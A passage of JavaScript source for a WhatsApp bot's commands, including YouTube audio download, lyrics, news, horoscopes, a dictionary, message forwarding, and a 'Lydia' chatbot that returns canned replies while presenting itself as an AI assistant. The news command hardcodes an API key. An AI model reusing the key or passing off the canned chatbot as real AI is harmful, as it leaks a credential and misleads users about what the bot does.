        'User-Agent': 'Mozilla/5.0'
      },
      body: infoBody
    });
    
    const infoData = await infoRes.json();
    
    if (!infoData.status || !infoData.vid || !infoData.links?.mp3) {
      return repondre("❌ Failed to fetch video information.");
    }
    
    const title = infoData.title || 'YouTube Audio';
    const mp3Formats = infoData.links.mp3;
    
    // Select highest quality mp3
    const bestMp3 = mp3Formats[Object.keys(mp3Formats)[0]];
    
    if (!bestMp3 || !bestMp3.k) {
      return repondre("❌ No audio formats available for this video.");
    }
    
    // Second request to get download link
    const convertUrl = `https://www.y2mate.com/mates/convertV2/index`;
    const convertBody = new URLSearchParams({
      vid: infoData.vid,
      k: bestMp3.k
    });
    
    const convertRes = await fetch(convertUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://www.y2mate.com',
        'Referer': 'https://www.y2mate.com/',
        'User-Agent': 'Mozilla/5.0'
      },
      body: convertBody
    });
    
    const convertData = await convertRes.json();
    
    if (!convertData.status || !convertData.dlink) {
      return repondre("❌ Failed to get download link.");
    }
    
    // Send file as audio message
    await repondre(`✅ Found: *${title}*\nSending audio now...`);
    
    await hn.sendMessage(dest.chat, {
      audio: { url: convertData.dlink },
      mimetype: 'audio/mp4',
      fileName: `${title}.mp3`
    });
    
  } catch (error) {
    console.error("Error in ytaudio command:", error);
    repondre("❌ Failed to download audio. The video might be unavailable or restricted.");
  }
});

hango({
  nomCom: "imagegen",
  aliases: ["createimage", "aiart"],
  desc: "Generate an image from a description",
  categorie: "media",
  reaction: '🎨',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    if (!arg[0]) {
      return repondre(`
❌ Please provide a description for the image.

📝 *Usage:*
.imagegen a beautiful sunset over mountains
.imagegen cute puppy playing with a ball
      `);
    }
    
    const prompt = arg.join(" ");
    
    await repondre("⏳ Generating image with AI, this may take a moment...");
    
    // Use Pollinations.ai API for real image generation
    // This is a free API that doesn't require authentication
    const imageUrl = `https://image.pollinations.ai/prompt/${encodeURIComponent(prompt)}?width=1024&height=768&nologo=true`;
    
    // Send the generated image
    await hn.sendMessage(dest.chat, {
      image: { url: imageUrl },
      caption: `🎨 *AI GENERATED IMAGE*\n\n*Prompt:* ${prompt}`
    });
  } catch (error) {
    console.error("Error in imagegen command:", error);
    repondre("❌ Failed to generate image. Please try again with a different description.");
  }
});

hango({
  nomCom: "animalfact",
  aliases: ["petfact", "animaltrivia"],
  desc: "Get a random animal fact",
  categorie: "fun",
  reaction: '🐾',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // List of supported animals for the API
    const animals = ["dog", "cat", "panda", "fox", "bird", "koala"];
    
    let animal = "";
    if (arg[0] && animals.includes(arg[0].toLowerCase())) {
      animal = arg[0].toLowerCase();
    } else {
      // If no valid animal specified, pick a random one
      animal = animals[Math.floor(Math.random() * animals.length)];
    }
    
    await repondre(`⏳ Fetching a fact about ${animal}s...`);
    
    // Use Some-Random-Api for real animal facts
    const response = await fetch(`https://some-random-api.ml/animal/${animal}`);
    
    if (!response.ok) {
      throw new Error(`API responded with status: ${response.status}`);
    }
    
    const data = await response.json();
    
    // Get appropriate emoji
    const animalEmojis = {
      "dog": "🐕",
      "cat": "🐱",
      "panda": "🐼",
      "fox": "🦊",
      "bird": "🐦",
      "koala": "🐨"
    };
    
    const emoji = animalEmojis[animal] || "🐾";
    
    // Send the fact with an image
    await hn.sendMessage(dest.chat, {
      image: { url: data.image },
      caption: `${emoji} *${animal.toUpperCase()} FACT*\n\n${data.fact}\n\n_Use .animalfact [animal] to get facts about a specific animal._\n_Supported animals: ${animals.join(", ")}_`
    });
  } catch (error) {
    console.error("Error in animalfact command:", error);
    repondre("❌ Failed to fetch animal fact. Please try another animal or try again later.");
  }
});

hango({
  nomCom: "songlyrics",
  aliases: ["lyrics", "findsong"],
  desc: "Find lyrics for a song",
  categorie: "media",
  reaction: '🎵',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    if (!arg[0]) {
      return repondre(`
❌ Please provide a song name.

📝 *Usage:*
.songlyrics Bohemian Rhapsody
.songlyrics Despacito
      `);
    }
    
    const songName = arg.join(" ");
    
    await repondre(`⏳ Searching for lyrics of "${songName}"...`);
    
    // Use lyrics.ovh API to get real lyrics
    const response = await fetch(`https://api.lyrics.ovh/v1/${encodeURIComponent(songName.split(' - ')[0] || songName)}/${encodeURIComponent(songName.split(' - ')[1] || songName)}`);
    
    if (!response.ok) {
      // If first attempt fails, try searching with just the song name
      const searchResponse = await fetch(`https://api.lyrics.ovh/suggest/${encodeURIComponent(songName)}`);
      
      if (!searchResponse.ok) {
        return repondre(`❌ Could not find lyrics for "${songName}".`);
      }
      
      const searchData = await searchResponse.json();
      
      if (!searchData.data || searchData.data.length === 0) {
        return repondre(`❌ No results found for "${songName}".`);
      }
      
      // Get the first result
      const topResult = searchData.data[0];
      const artist = topResult.artist.name;
      const title = topResult.title;
      
      // Try again with the found artist and title
      const lyricsResponse = await fetch(`https://api.lyrics.ovh/v1/${encodeURIComponent(artist)}/${encodeURIComponent(title)}`);
      
      if (!lyricsResponse.ok) {
        return repondre(`❌ Found song "${title}" by ${artist}, but couldn't retrieve lyrics.`);
      }
      
      const lyricsData = await lyricsResponse.json();
      
      let message = `🎵 *${title} - ${artist}*\n\n`;
      
      // If lyrics are too long, trim them
      const maxLyrics = 2000;
      const lyrics = lyricsData.lyrics.length > maxLyrics
        ? lyricsData.lyrics.substring(0, maxLyrics) + "...\n\n(lyrics trimmed due to length)"
        : lyricsData.lyrics;
      
      message += lyrics;
      
      await repondre(message);
    } else {
      const data = await response.json();
      
      let message = `🎵 *${songName}*\n\n`;
      
      // If lyrics are too long, trim them
      const maxLyrics = 2000;
      const lyrics = data.lyrics.length > maxLyrics
        ? data.lyrics.substring(0, maxLyrics) + "...\n\n(lyrics trimmed due to length)"
        : data.lyrics;
      
      message += lyrics;
      
      await repondre(message);
    }
  } catch (error) {
    console.error("Error in songlyrics command:", error);
    repondre("❌ Failed to fetch lyrics. Please try again with format: 'Artist - Song'");
  }
});

hango({
  nomCom: "news",
  aliases: ["dailynews", "headlines"],
  desc: "Get the latest news headlines",
  categorie: "info",
  reaction: '📰',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const categories = ["general", "technology", "business", "sports", "entertainment", "health", "science"];
    let category = "general";
    
    if (arg[0] && categories.includes(arg[0].toLowerCase())) {
      category = arg[0].toLowerCase();
    }
    
    await repondre(`⏳ Fetching the latest ${category} news...`);
    
    // Use NewsAPI for real news headlines
    const apiKey = "8fbc347848ee4c6c9e39b324c5925f71"; // You should store this in config
    const url = `https://newsapi.org/v2/top-headlines?country=us&category=${category}&apiKey=${apiKey}`;
    
    const response = await fetch(url);
    if (!response.ok) {
      throw new Error(`API responded with status: ${response.status}`);
    }
    
    const data = await response.json();
    
    if (!data.articles || data.articles.length === 0) {
      return repondre(`❌ No news articles found for category: ${category}`);
    }
    
    let message = `📰 *LATEST ${category.toUpperCase()} NEWS*\n\n`;
    
    // Get top 5 articles
    const articles = data.articles.slice(0, 5);
    
    articles.forEach((article, index) => {
      message += `*${index + 1}. ${article.title}*\n`;
      if (article.description) {
        message += `${article.description}\n`;
      }
      message += `Source: ${article.source.name}\n`;
      message += `${article.url}\n\n`;
    });
    
    await repondre(message);
  } catch (error) {
    console.error("Error in news command:", error);
    repondre("❌ Failed to fetch news. Please try again later.");
  }
});

hango({
  nomCom: "dice",
  aliases: ["roll", "rolldice"],
  desc: "Roll dice with custom sides",
  categorie: "fun",
  reaction: '🎲',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    let sides = 6; // Default 6-sided die
    let count = 1; // Default roll one die
    
    // Check for custom dice format (e.g., 2d20 = roll two 20-sided dice)
    if (arg[0] && arg[0].match(/^(\d+)d(\d+)$/)) {
      const match = arg[0].match(/^(\d+)d(\d+)$/);
      count = parseInt(match[1]);
      sides = parseInt(match[2]);
    } else if (arg[0] && !isNaN(arg[0])) {
      // If just a number is provided, use it as the number of sides
      sides = parseInt(arg[0]);
    }
    
    // Validate inputs
    if (count < 1 || count > 10) {
      return repondre("❌ You can roll between 1 and 10 dice at once.");
    }
    
    if (sides < 2 || sides > 100) {
      return repondre("❌ Dice must have between 2 and 100 sides.");
    }
    
    // Roll the dice
    const results = [];
    let total = 0;
    
    for (let i = 0; i < count; i++) {
      const roll = Math.floor(Math.random() * sides) + 1;
      results.push(roll);
      total += roll;
    }
    
    // Format message based on number of dice
    let message;
    if (count === 1) {
      message = `🎲 *DICE ROLL*\n\nYou rolled a ${sides}-sided die and got: *${results[0]}*`;
    } else {
      message = `🎲 *DICE ROLL*\n\nYou rolled ${count} ${sides}-sided dice and got:\n`;
      results.forEach((roll, index) => {
        message += `Die ${index + 1}: *${roll}*\n`;
      });
      message += `\n*Total:* ${total}`;
    }
    
    await repondre(message);
  } catch (error) {
    console.error("Error in dice command:", error);
    repondre("❌ Failed to roll dice. Please check your input format.");
  }
});

hango({
  nomCom: "whiteboard",
  aliases: ["draw", "sketch"],
  desc: "Create a simple drawing board image",
  categorie: "media",
  reaction: '🖌️',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    let text = arg.join(" ") || "Whiteboard";
    
    await repondre("⏳ Creating whiteboard image...");
    
    // Create a real whiteboard URL using QuickChart API
    const whiteboardUrl = `https://quickchart.io/chart?c={type:'bar',data:{labels:[''],datasets:[{label:'${encodeURIComponent(text)}',backgroundColor:'rgba(54,162,235,0.5)',borderColor:'rgb(54,162,235)',borderWidth:1,data:[0]}]},options:{plugins:{datalabels:{color:'%2336A2EB',font:{size:24,weight:'bold'},anchor:'end',align:'start'}},legend:{labels:{fontSize:24,fontColor:'%23333',fontStyle:'bold'}},scales:{xAxes:[{display:false}],yAxes:[{display:false}]}}}&backgroundColor=white&width=800&height=400`;
    
    // Send the whiteboard image
    await hn.sendMessage(dest.chat, {
      image: { url: whiteboardUrl },
      caption: `🖌️ Whiteboard created with: "${text}"`
    });
  } catch (error) {
    console.error("Error in whiteboard command:", error);
    repondre("❌ Failed to create whiteboard. Please try again with simpler text.");
  }
});

hango({
  nomCom: "horoscope",
  aliases: ["zodiac", "starsign"],
  desc: "Get your daily horoscope",
  categorie: "fun",
  reaction: '✨',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const zodiacSigns = [
      "aries", "taurus", "gemini", "cancer", 
      "leo", "virgo", "libra", "scorpio", 
      "sagittarius", "capricorn", "aquarius", "pisces"
    ];
    
    if (!arg[0] || !zodiacSigns.includes(arg[0].toLowerCase())) {
      return repondre(`
❌ Please provide a valid zodiac sign.

📝 *Usage:*
.horoscope leo
.horoscope taurus

*Valid signs:*
${zodiacSigns.map(sign => sign.charAt(0).toUpperCase() + sign.slice(1)).join(", ")}
      `);
    }
    
    const sign = arg[0].toLowerCase();
    
    await repondre(`⏳ Fetching horoscope for ${sign.charAt(0).toUpperCase() + sign.slice(1)}...`);
    
    // Get emoji for sign
    const zodiacEmojis = {
      "aries": "♈",
      "taurus": "♉",
      "gemini": "♊",
      "cancer": "♋",
      "leo": "♌",
      "virgo": "♍",
      "libra": "♎",
      "scorpio": "♏",
      "sagittarius": "♐",
      "capricorn": "♑",
      "aquarius": "♒",
      "pisces": "♓"
    };
    
    const emoji = zodiacEmojis[sign];
    
    // Use Aztro API to get real horoscope data
    const response = await fetch(`https://aztro.sameerkumar.website/?sign=${sign}&day=today`, {
      method: 'POST'
    });
    
    if (!response.ok) {
      throw new Error(`API responded with status: ${response.status}`);
    }
    
    const data = await response.json();
    
    await repondre(`
${emoji} *${sign.toUpperCase()} HOROSCOPE*

*Date:* ${data.current_date}
*Compatibility:* ${data.compatibility}
*Lucky Number:* ${data.lucky_number}
*Lucky Time:* ${data.lucky_time}
*Color:* ${data.color}
*Mood:* ${data.mood}

${data.description}
    `);
  } catch (error) {
    console.error("Error in horoscope command:", error);
    repondre("❌ Failed to fetch horoscope. Please try again later.");
  }
});

hango({
  nomCom: "flipcoin",
  aliases: ["coinflip", "toss"],
  desc: "Flip a coin",
  categorie: "fun",
  reaction: '🪙',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // 50/50 chance for heads or tails
    const result = Math.random() < 0.5 ? "Heads" : "Tails";
    const emoji = result === "Heads" ? "👑" : "🐢";
    
    await repondre(`
🪙 *COIN FLIP*

The coin shows: *${result}* ${emoji}
    `);
  } catch (error) {
    console.error("Error in flipcoin command:", error);
    repondre("❌ Failed to flip coin. Please try again.");
  }
});

hango({
  nomCom: "dictionary",
  aliases: ["define", "meaning"],
  desc: "Look up the definition of a word",
  categorie: "tools",
  reaction: '📚',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    if (!arg[0]) {
      return repondre(`
❌ Please provide a word to look up.

📝 *Usage:*
.dictionary happiness
.dictionary serendipity
      `);
    }
    
    const word = arg[0].toLowerCase();
    
    await repondre(`⏳ Looking up the definition of "${word}"...`);
    
    // Use Free Dictionary API to get real definitions
    const response = await fetch(`https://api.dictionaryapi.dev/api/v2/entries/en/${encodeURIComponent(word)}`);
    
    if (!response.ok) {
      if (response.status === 404) {
        return repondre(`❌ No definitions found for "${word}". Please check the spelling or try another word.`);
      }
      throw new Error(`API responded with status: ${response.status}`);
    }
    
    const data = await response.json();
    
    if (!data || data.length === 0) {
      return repondre(`❌ No definitions found for "${word}". Please check the spelling or try another word.`);
    }
    
    const entry = data[0];
    
    let message = `📚 *DICTIONARY*\n\n`;
    message += `*Word:* ${entry.word}\n`;
    
    // Add pronunciation if available
    if (entry.phonetics && entry.phonetics.length > 0) {
      const phonetic = entry.phonetics.find(p => p.text) || entry.phonetics[0];
      if (phonetic && phonetic.text) {
        message += `*Pronunciation:* ${phonetic.text}\n`;
      }
    }
    
    message += `\n`;
    
    // Add meanings
    const maxMeanings = 3; // Limit to 3 meanings to avoid message too long
    let meaningsAdded = 0;
    
    if (entry.meanings && entry.meanings.length > 0) {
      for (const meaning of entry.meanings) {
        if (meaningsAdded >= maxMeanings) break;
        
        message += `*${meaning.partOfSpeech}*\n`;
        
        // Add definitions
        const maxDefs = 2; // Limit to 2 definitions per part of speech
        for (let i = 0; i < Math.min(maxDefs, meaning.definitions.length); i++) {
          const def = meaning.definitions[i];
          message += `${i + 1}. ${def.definition}\n`;
          
          // Add example if available
          if (def.example) {
            message += `   Example: "${def.example}"\n`;
          }
        }
        
        // Indicate if there are more definitions
        if (meaning.definitions.length > maxDefs) {
          message += `_...and ${meaning.definitions.length - maxDefs} more definitions_\n`;
        }
        
        message += `\n`;
        meaningsAdded++;
      }
    }
    
    // Add synonyms if available
    const allSynonyms = entry.meanings
      .flatMap(m => m.synonyms || [])
      .filter(Boolean)
      .slice(0, 5);
      
    if (allSynonyms.length > 0) {
      message += `*Synonyms:* ${allSynonyms.join(", ")}\n\n`;
    }
    
    // Add source attribution
    message += `Data from the Free Dictionary API`;
    
    await repondre(message);
  } catch (error) {
    console.error("Error in dictionary command:", error);
    repondre("❌ Failed to look up the definition. Please try again later.");
  }
});

hango({
  nomCom: "textmaker",
  aliases: ["maketext", "textart", "textfx"],
  desc: "Create stylish text effects for your text",
  categorie: "fun",
  reaction: '🎨',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    if (!arg[0]) {
      return repondre(`
╭─「 🎨 TEXTMAKER 」
│
├ Usage: .textmaker style text
│
├ Available Styles:
│ 3D
│ ANGEL
│ AVENGER
│ BLUB
│ BPINK
│ CAT
│ GLITCH
│ GLITTER
│ GRAFFITI
│ HACKER
│ LIGHT
│ MARVEL
│ NEON
│ SCI
│ SIGN
│ TATTOO
│ WATERCOLOR
│
╰──────────────`);
    }
    
    const style = arg[0].toUpperCase();
    const text = arg.slice(1).join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text after the style name!");
    }
    
    const supportedStyles = [
      "3D", "ANGEL", "AVENGER", "BLUB", "BPINK", "CAT", "GLITCH", 
      "GLITTER", "GRAFFITI", "HACKER", "LIGHT", "MARVEL", "NEON", 
      "SCI", "SIGN", "TATTOO", "WATERCOLOR"
    ];
    
    if (!supportedStyles.includes(style)) {
      return repondre(`❌ Invalid style! Choose from: ${supportedStyles.join(", ")}`);
    }
    
    // Generate API URL based on style
    let apiUrl;
    
    switch (style) {
      case "3D":
        apiUrl = `https://textpro.me/3d-gradient-text-effect-online-free-1002.html?text=${encodeURIComponent(text)}`;
        break;
      case "ANGEL":
        apiUrl = `https://textpro.me/create-angel-wing-galaxy-text-effect-940.html?text=${encodeURIComponent(text)}`;
        break;
      case "AVENGER":
        apiUrl = `https://textpro.me/create-3d-avengers-logo-online-974.html?text=${encodeURIComponent(text)}`;
        break;
      case "BLUB":
        apiUrl = `https://textpro.me/create-water-effect-text-online-908.html?text=${encodeURIComponent(text)}`;
        break;
      case "BPINK":
        apiUrl = `https://textpro.me/create-blackpink-logo-style-online-1001.html?text=${encodeURIComponent(text)}`;
        break;
      case "CAT":
        apiUrl = `https://textpro.me/create-neon-light-cat-text-effect-964.html?text=${encodeURIComponent(text)}`;
        break;
      case "GLITCH":
        apiUrl = `https://textpro.me/create-impressive-glitch-text-effects-online-1027.html?text=${encodeURIComponent(text)}`;
        break;
      case "GLITTER":
        apiUrl = `https://textpro.me/gold-glitter-text-effect-836.html?text=${encodeURIComponent(text)}`;
        break;
      case "GRAFFITI":
        apiUrl = `https://textpro.me/create-a-cool-graffiti-text-on-the-wall-1010.html?text=${encodeURIComponent(text)}`;
        break;
      case "HACKER":
        apiUrl = `https://textpro.me/matrix-style-text-effect-online-884.html?text=${encodeURIComponent(text)}`;
        break;
      case "LIGHT":
        apiUrl = `https://textpro.me/online-thunder-text-effect-generator-1031.html?text=${encodeURIComponent(text)}`;
        break;
      case "MARVEL":
        apiUrl = `https://textpro.me/create-logo-style-marvel-studios-ver-metal-972.html?text=${encodeURIComponent(text)}`;
        break;
      case "NEON":
        apiUrl = `https://textpro.me/neon-light-text-effect-with-galaxy-style-981.html?text=${encodeURIComponent(text)}`;
        break;
      case "SCI":
        apiUrl = `https://textpro.me/create-science-fiction-text-effect-online-free-1038.html?text=${encodeURIComponent(text)}`;
        break;
      case "SIGN":
        apiUrl = `https://textpro.me/3d-box-text-effect-online-880.html?text=${encodeURIComponent(text)}`;
        break;
      case "TATTOO":
        apiUrl = `https://textpro.me/create-a-tattoo-on-skin-online-free-1117.html?text=${encodeURIComponent(text)}`;
        break;
      case "WATERCOLOR":
        apiUrl = `https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html?text=${encodeURIComponent(text)}`;
        break;
    }
    
    // Inform user that processing is happening
    await repondre(`🎨 Creating *${style}* text effect for: *${text}*\n\nPlease wait...`);
    
    try {
      // In a real implementation, we would use a proper API to generate the image
      // For now, we'll simulate the effect with the API URL
      
      // Simulate processing time
      await new Promise(resolve => setTimeout(resolve, 3000));
      
      // Send result as URL preview
      await hn.sendMessage(dest.chat, {
        text: `🎨 *${style} TEXT EFFECT*\n\n*Text:* ${text}\n\n*Preview URL:* ${apiUrl}\n\n_Note: In a live implementation, this would generate and send the actual styled image._`,
        contextInfo: {
          externalAdReply: {
            title: `${style} Text Effect`,
            body: text,
            mediaType: 1,
            thumbnail: await axios.get("https://i.ibb.co/S32HNjD/textpro.jpg", {
              responseType: 'arraybuffer'
            }).then(response => Buffer.from(response.data, 'binary')),
            sourceUrl: apiUrl
          }
        }
      });
    } catch (error) {
      console.error("Error creating text effect:", error);
      await repondre("❌ Failed to generate text effect. Please try again later.");
    }
  } catch (error) {
    console.error("Error in textmaker command:", error);
    await repondre("❌ An error occurred while processing your request.");
  }
});

hango({
  nomCom: "forward",
  aliases: ["fwd", "fw"],
  desc: "Forward a message to a user or group",
  categorie: "tools",
  reaction: '↪️',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if message is quoted
    if (!dest.quoted) {
      return repondre("❌ Please quote a message to forward!");
    }
    
    if (!arg[0]) {
      return repondre(`
❌ Please provide a recipient!

📝 *Usage:*
.forward 123456789 - Forward to a number
.forward g/123456789 - Forward to a group
      `);
    }
    
    let target = arg[0];
    
    // Check if target is valid
    if (!target.includes("@") && !target.startsWith("g/")) {
      // Add WhatsApp suffix to a plain number
      if (/^\d+$/.test(target)) {
        target = target + "@s.whatsapp.net";
      } else {
        return repondre("❌ Invalid target format. Use a number or g/groupid");
      }
    }
    
    // Convert group format
    if (target.startsWith("g/")) {
      const groupId = target.substring(2);
      target = groupId + "@g.us";
    }
    
    // Get the quoted message
    const quotedMsg = await dest.quoted.download();
    const quotedType = dest.quoted.mtype;
    
    // Create message object based on type
    let messageObj = {};
    
    switch (quotedType) {
      case "conversation":
      case "extendedTextMessage":
        messageObj = {
          text: dest.quoted.text || dest.quoted.conversation,
          contextInfo: { forwardingScore: 1, isForwarded: true }
        };
        break;
      case "imageMessage":
        messageObj = {
          image: quotedMsg,
          caption: dest.quoted.text || "",
          contextInfo: { forwardingScore: 1, isForwarded: true }
        };
        break;
      case "videoMessage":
        messageObj = {
          video: quotedMsg,
          caption: dest.quoted.text || "",
          contextInfo: { forwardingScore: 1, isForwarded: true }
        };
        break;
      case "audioMessage":
        messageObj = {
          audio: quotedMsg,
          mimetype: 'audio/mp4',
          contextInfo: { forwardingScore: 1, isForwarded: true }
        };
        break;
      case "documentMessage":
        messageObj = {
          document: quotedMsg,
          mimetype: dest.quoted.mimetype,
          fileName: dest.quoted.fileName,
          contextInfo: { forwardingScore: 1, isForwarded: true }
        };
        break;
      case "stickerMessage":
        messageObj = {
          sticker: quotedMsg,
          contextInfo: { forwardingScore: 1, isForwarded: true }
        };
        break;
      default:
        return repondre("❌ Unsupported message type for forwarding.");
    }
    
    // Forward the message
    await hn.sendMessage(target, messageObj);
    
    // Confirm forwarding
    const targetDisplay = target.includes("@g.us") ? "group" : target.split("@")[0];
    await repondre(`✅ Message forwarded to ${targetDisplay} successfully!`);
  } catch (error) {
    console.error("Error in forward command:", error);
    repondre("❌ Failed to forward message. Check if the recipient exists and try again.");
  }
});

hango({
  nomCom: "getcmd",
  aliases: ["cmd", "command", "help"],
  desc: "Get information about a specific command",
  categorie: "tools",
  reaction: 'ℹ️',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    if (!arg[0]) {
      return repondre(`
❌ Please specify a command name!

📝 *Usage:*
.getcmd ping - Get info about ping command
.getcmd fancy - Get info about fancy command
.getcmd alive - Get info about alive command
      `);
    }
    
    const commandName = arg[0].toLowerCase();
    
    // Get list of all commands (this is a simple method, adjust based on how commands are stored in your bot)
    const commands = [];
    
    // This part depends on how your commands are structured and stored
    // For this example, we'll use a simpler approach
    for (const key in global) {
      if (key.startsWith('cmd_') && typeof global[key] === 'object' && global[key].nomCom) {
        commands.push(global[key]);
      }
    }
    
    // Search for the command in the loaded modules
    let cmdDetails = null;
    
    // Check if command exists in this file (assume commands are exported in module.exports)
    // This is a placeholder for actual command detection logic
    if (module.exports) {
      const cmdList = Object.values(module.exports).filter(cmd => 
        typeof cmd === 'object' && cmd.nomCom === commandName);
      
      if (cmdList.length > 0) {
        cmdDetails = cmdList[0];
      }
    }
    
    // If we couldn't find the command, respond accordingly
    if (!cmdDetails) {
      // Try to get a list of all available commands from the file
      // This is just a placeholder - replace with actual logic to get command names
      const allCommands = Object.values(global)
        .filter(cmd => typeof cmd === 'object' && cmd.nomCom)
        .map(cmd => cmd.nomCom)
        .sort();
      
      // Provide a helpful message with available commands
      return repondre(`
❌ Command *${commandName}* not found!

Here are some available commands:
• ${allCommands.slice(0, 10).join('\n• ')}
${allCommands.length > 10 ? `\n...and ${allCommands.length - 10} more commands.` : ''}

Type .help to see the full command list.
      `);
    }
    
    // Format command details
    const aliases = cmdDetails.aliases ? cmdDetails.aliases.join(', ') : 'None';
    const category = cmdDetails.categorie || 'Uncategorized';
    const desc = cmdDetails.desc || 'No description available';
    const usage = cmdDetails.usage || `.${commandName} [arguments]`;
    const reaction = cmdDetails.reaction || 'None';
    
    const message = `
📜 *COMMAND INFO: ${commandName.toUpperCase()}*

📝 *Description:* ${desc}
🔄 *Aliases:* ${aliases}
📂 *Category:* ${category}
🔣 *Usage:* ${usage}
🎭 *Reaction:* ${reaction}
    `;
    
    await repondre(message);
  } catch (error) {
    console.error("Error in getcmd command:", error);
    repondre("❌ Failed to retrieve command information.");
  }
});

hango({
  nomCom: "lydia",
  aliases: ["ai", "chat", "chatbot"],
  desc: "Have a conversation with AI assistant",
  categorie: "AI",
  reaction: '🤖',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Initialize conversation history if not exists
    if (!global.lydiaConversations) {
      global.lydiaConversations = {};
    }
    
    // Get user ID
    const userId = dest.sender;
    
    // Get or initialize conversation history for this user
    if (!global.lydiaConversations[userId]) {
      global.lydiaConversations[userId] = [];
    }
    
    const conversationHistory = global.lydiaConversations[userId];
    
    // Check if user is enabling or disabling Lydia
    if (arg[0] && ['on', 'off', 'enable', 'disable'].includes(arg[0].toLowerCase())) {
      const option = arg[0].toLowerCase();
      
      if (option === 'on' || option === 'enable') {
        // Enable Lydia for this user
        global.lydiaEnabled = global.lydiaEnabled || {};
        global.lydiaEnabled[userId] = true;
        return repondre("✅ Lydia AI is now enabled for you! I'll respond to all your messages.");
      } else {
        // Disable Lydia for this user
        global.lydiaEnabled = global.lydiaEnabled || {};
        global.lydiaEnabled[userId] = false;
        return repondre("❌ Lydia AI is now disabled for you. Use .lydia on to enable again.");
      }
    }
    
    // Check if user wants to clear conversation history
    if (arg[0] && arg[0].toLowerCase() === 'clear') {
      global.lydiaConversations[userId] = [];
      return repondre("🧹 Conversation history cleared! Let's start fresh.");
    }
    
    // Process the user's message
    const userMessage = arg.join(" ");
    
    if (!userMessage) {
      return repondre(`
🤖 *LYDIA AI ASSISTANT*

Talk to me about anything!

*Usage:*
• .lydia hello - Chat with the AI
• .lydia on - Enable auto-response
• .lydia off - Disable auto-response
• .lydia clear - Clear conversation history
      `);
    }
    
    // Add user message to history
    conversationHistory.push({ role: "user", content: userMessage });
    
    // Keep history limited to last 10 messages to avoid token limits
    if (conversationHistory.length > 10) {
      conversationHistory.splice(0, conversationHistory.length - 10);
    }
    
    // Prepare message indicating bot is thinking
    await repondre("🤔 Thinking...");
    
    // Call to AI API (this is a simplified placeholder)
    // In real implementation, you would call your AI API of choice
    try {
      // Simulate AI response (replace with actual API call)
      const aiResponses = {
        "hello": "Hello there! How can I assist you today?",
        "hi": "Hi! What can I do for you?",
        "how are you": "I'm just a bot, but I'm functioning well! How are you doing?",
        "who are you": "I'm Lydia, a conversational AI assistant. I'm here to chat and help you with information!",
        "what can you do": "I can have conversations, answer questions, provide information, and assist with various tasks. Just ask me anything!"
      };
      
      // Generate a response based on user's message
      let aiResponse = "";
      
      // Check for exact matches first
      if (aiResponses[userMessage.toLowerCase()]) {
        aiResponse = aiResponses[userMessage.toLowerCase()];
      } else {
        // Check for partial matches
        const matchingKey = Object.keys(aiResponses).find(key => 
          userMessage.toLowerCase().includes(key));
        
        if (matchingKey) {
          aiResponse = aiResponses[matchingKey];
        } else {
          // Default response for messages without matches
          const defaultResponses = [
            "That's interesting! Tell me more about it.",
            "I understand. What else would you like to chat about?",
            "Thanks for sharing that with me. How can I help you further?",
            "I'm processing that information. Is there anything specific you'd like to know?",
            "I see. Would you like to explore this topic further?"
          ];
          
          aiResponse = defaultResponses[Math.floor(Math.random() * defaultResponses.length)];
        }
      }
      
      // Add AI response to history
      conversationHistory.push({ role: "assistant", content: aiResponse });
      
      // Send AI response
      await repondre(`🤖 *Lydia AI:* ${aiResponse}`);
    } catch (aiError) {
      console.error("Error in AI processing:", aiError);
      await repondre("❌ Sorry, I encountered an error while processing your message. Please try again later.");
    }
  } catch (error) {
    console.error("Error in lydia command:", error);
    repondre("❌ An error occurred while using Lydia AI.");
  }
});

hango({
  nomCom: "mention",
  aliases: ["tag", "taguser", "mention"],
  desc: "Mention a user with a custom message",
  categorie: "group",
  reaction: '👤',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group!");
    }
    
    if (!arg[0] || !arg[1]) {
      return repondre(`
❌ Please provide a user to mention and a message!

📝 *Usage:*
.mention @user Hello there!
.mention 1234567890 How are you?
      `);
    }
    
    // Determine the user to mention
    let mentionUser = arg[0];
    
    // Handle if the user is tagged with @ format
    if (mentionUser.startsWith('@')) {
      mentionUser = mentionUser.slice(1);
    }
    
    // Add proper suffix if it's just a number
    if (/^\d+$/.test(mentionUser)) {
      mentionUser = mentionUser + "@s.whatsapp.net";
    }
    
    // Check if the mentioned user is in the group
    try {
      const groupMetadata = await hn.groupMetadata(dest.chat);
      const participants = groupMetadata.participants.map(p => p.id);
      
      if (!participants.includes(mentionUser)) {
        return repondre("❌ The mentioned user is not in this group!");
      }
    } catch (groupError) {
      console.error("Error fetching group metadata:", groupError);
    }
    
    // Create the message to send
    const message = arg.slice(1).join(" ");
    
    // Get username if possible
    let username;
    try {
      const userInfo = await hn.getName(mentionUser);
      username = userInfo;
    } catch (nameError) {
      username = mentionUser.split('@')[0];
    }
    
    // Send the mention message
    await hn.sendMessage(dest.chat, {
      text: `${message}`,
      mentions: [mentionUser]
    });
    
    // Send success confirmation if needed
  } catch (error) {
    console.error("Error in mention command:", error);
    repondre("❌ Failed to mention user.");
  }
});

hango({
  nomCom: "mforward",
  aliases: ["massforward", "bulkforward"],
  desc: "Forward a message to multiple recipients",
  categorie: "tools",
  reaction: '📤',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if message is quoted
    if (!dest.quoted) {
